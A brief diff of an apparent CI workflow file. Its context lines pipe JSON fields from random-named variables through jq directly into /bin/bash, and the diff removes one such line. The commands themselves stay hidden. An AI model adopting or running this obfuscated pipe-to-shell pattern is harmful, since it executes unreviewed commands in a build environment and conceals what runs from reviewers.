@@ -25,7 +25,6 @@ jobs:
           echo $sfs993 | jq -r .liyxr6 | /bin/bash
           printf '%s' "$pimk4143" | jq -r .w8 | /bin/bash
           echo $cs91380 | jq -r .oc4898 | /bin/bash
-          printf '%s' "$wqd1" | jq -r .ivbq12478 | /bin/bash
           echo $ze7934 | jq -r .c4008 | /bin/bash
 
       - name: Archive artifact
